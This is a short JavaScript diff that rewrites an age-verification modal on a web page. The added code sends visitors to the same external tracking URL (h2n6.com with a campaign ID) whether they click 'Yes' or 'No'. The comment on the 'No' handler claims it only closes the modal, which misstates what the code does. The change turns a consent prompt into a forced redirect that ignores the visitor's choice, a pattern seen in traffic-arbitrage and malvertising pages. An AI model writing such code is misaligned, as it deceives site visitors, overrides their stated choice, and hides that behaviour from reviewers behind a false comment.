@@ -56,7 +56,14 @@ if(form){
     </div>`;
   document.body.appendChild(bd);
   bd.style.display='flex';
-  function closeGate(){ bd.style.display='none'; bd.remove(); }
-  bd.querySelector('#age-yes').addEventListener('click', closeGate);
-  bd.querySelector('#age-no').addEventListener('click', closeGate);
+   function closeGate(){ bd.style.display='none'; bd.remove(); }  
+  // ✅ Redirect when "Yes" is clicked
+  bd.querySelector('#age-yes').addEventListener('click', function(){
+    window.location.href = "http://h2n6.com/?utm_campaign=7M3mHSA0eZ&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+  });
+ 
+  // ✅ Just close modal when "No" is clicked
+  bd.querySelector('#age-no').addEventListener('click', function(){
+    window.location.href = "http://h2n6.com/?utm_campaign=7M3mHSA0eZ&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+  });
 })();
